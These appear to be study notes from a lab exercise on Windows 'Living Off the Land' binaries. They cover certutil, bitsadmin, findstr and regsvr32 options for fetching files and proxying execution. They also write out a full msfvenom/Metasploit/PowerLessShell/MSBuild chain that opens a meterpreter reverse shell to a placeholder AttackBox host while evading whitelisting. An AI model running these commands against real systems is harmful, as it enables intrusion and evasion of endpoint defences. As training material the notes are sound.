Certutil Options:
  -urlcache   Display URL, enables the URL option to use in the command
  -split -f   Split and force fetching files from the provided URL
  -encode     Encode file
  -decode     Decode file

BITSAdmin Options:
  /Transfer   Use the transfer option
  /Download   specify transfer using download type
  /Priority   Set the priority of the job to be running in the foreground

FindStr Options:
  /V           Print out the lines that don't contain the string provided
  dummystring  Text to be searched for; in this case, we provide a string that must not be found in a file
  > c:\Windows\Temp\test.exe
              Redirect the output to a file on the target machine

Regsvr32 Options:
 	/s   Silent mode (without showing messages)
 	/n   Not call the DLL register server
 	/i:: Use another server since we used /n
 	/u   Run with unregister method


Informational:
  Certutil is a Windows built-in utility for handling certification services. It is used to dump and display Certification Authority (CA) configuration information and other CA components.

  BITSAdmin - System administrator utility that can be used to create, download or upload Background Intelligent Transfer Service (BITS) jobs and check their progress.

  Findstr is a Microsoft built-in tool used to find text and string patterns in files. 

  Windows Management Instrumentation (WMIC) is used to execute binaries for evading defensive measures. The MITRE ATT&CK framework refers to this technique as Signed Binary Proxy Execution (T1218).

  Application Whitelisting is a Microsoft endpoint security feature that prevents malicious and unauthorized programs from executing in real-time.



Other techniques:
msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1
                                PowerLessShell is a Python-based tool that generates malicious code to run on a target machine
                                without showing an instance of the PowerShell process.
                                One of the project requirements is to get a PowerShell payload to make it suitable to work
                                with MSBuild. We need to generate a PowerShell payload using msfvenom
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4443;exploit"
                                We need to run the Metasploit framework to listen and wait for the reverse shell
mv liv0ff.ps1 /tmp              Change to the PowerLessShell directory project to convert the payload to be compatible with the MSBuild tool.
PowerLessShell -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
                                Run the PowerLessShell tool and set the source file to the one we created with msfvenom
                                Once the command is executed successfully, we need to transfer the output file to the Windows machine.
                                You can do this using the `SCP` command or set a web server to host the file on the AttackBox (`python3 -m http.server 1337`)
                                and download the file using the browser.
c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Downloads\liv0ff.csproj
                                On the target Windows machine, build the `.csproj` file and wait for the reverse shell
                                Once we run the MSBuild command, wait a couple of seconds till we receive a reverse shell
                                Note that there will be no `powershell.exe` process is running

Informational:
Living Off the Land encompasses categories:
  Reconnaissance
  Files operations
  Arbitrary code execution
  Lateral movement
  Security product bypass 

LOLBAS Website search:
It is straightforward to look for a binary; including the binary name will show the result. 
To look for a specific function, we require providing a `/` before the function name. For instance, to look for 
all execute functions, we should use `/execute`. 
In order to look based on types, we should use the `#` symbol followed by the type name.
The following are the types included in the project:
  Script
  Binary
  Libraries
  OtherMSBinaries

The explorer.exe binary is located at:
  C:\Windows\explorer.exe for the Windows 32 bits version
  C:\Windows\SysWOW64\explorer.exe for the Windows 64 bits version

The rundll32.exe binary is located at:
	C:\Windows\System32\rundll32.exe for the Windows 32 bits version
	C:\Windows\SysWOW64\rundll32.exe for the Windows 64 bits version
